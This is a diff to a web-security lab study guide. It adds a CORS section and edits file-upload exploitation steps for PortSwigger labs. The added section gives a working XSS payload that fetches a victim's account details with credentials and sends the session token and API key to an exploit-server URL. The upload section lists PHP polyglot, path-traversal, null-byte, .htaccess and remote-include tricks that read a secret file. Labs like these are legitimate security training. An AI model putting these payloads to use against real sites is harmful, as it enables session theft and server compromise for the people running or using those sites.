@@ -19,6 +19,7 @@
 [JSON Web Tokens](#jwt)  
 [Prototype pollution](#prototype-pollution)  
 [Access Control](#access-control)  
+[Cross-origin resource sharing](#cors)  
   
 **[DATA EXFILTRATION](#data-exfiltration)**  
 [XML entities & Injections](#xxe-injections)  
@@ -1707,6 +1708,32 @@ X-Original-URL: /admin
   
 [PortSwigger Lab: URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)  
   
+## CORS  
+
+>***Identify*** in the source code the account details are requested with AJAX request.  
+
+![cors-ajax-request.png](images/cors-ajax-request.png)  
+
+>Test is CORS configuration allow access to sub-domains using below test header. If response include the ```Access-Control-Allow-Origin``` header with the origin reflect it is vulnerable.  
+
+```
+Origin: http://subdomain.TARGET.NET
+```  
+
+>The target call subdomain to retrieve stock values, and the ```productid``` parameter is vulnerable to cross-site scripting (XSS).
+
+![Subdomain cors xss](images/subdomain-cors-xss.png)  
+
+>Place code in the exploit server body and deliver to victim to steal AJAX session token and API key.  
+
+```html
+<script>
+    document.location="http://stock.TARGET.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT.NET/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```  
+
+[PortSwigger Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)  
+  
 # Data Exfiltration  
 
 ## XXE Injections  
@@ -2300,7 +2327,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 1. Upload the file name and include obfuscated path traversal ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
 2. Upload a file named, ```exploit.php%00.jpg``` with trailing null character and get the file execution at ```/files/avatars/exploit.php```  
-3. Create polygot using valid image file, by running the command in bash terminal: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. Once polygot uploaded, view the extracted data by issue a GET request to the uploaded path ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain the sensitive data.  
+3. Create **polygot** using valid image file, by running the command in bash terminal: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. Once polygot uploaded, view the extracted data by issue a GET request to the uploaded path ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain the sensitive data.  
 4. Upload two different files. First upload ***.htaccess*** with Content-Type: ```text/plain```, and the file data value set to ```AddType application/x-httpd-php .l33t```. This will allow the upload and execute of second file upload named, ```exploit.l33t``` with extension ```;333t```.  
 5. If target allow Remote File Include(RFI), upload from remote URL, then host and exploit file with the following GIF magic bytes: ```GIF89a; <?php echo file_get_contents('/home/carlos/secret'); ?>```. The file name on exploit server could read ```image.php%00.gif```.    
   
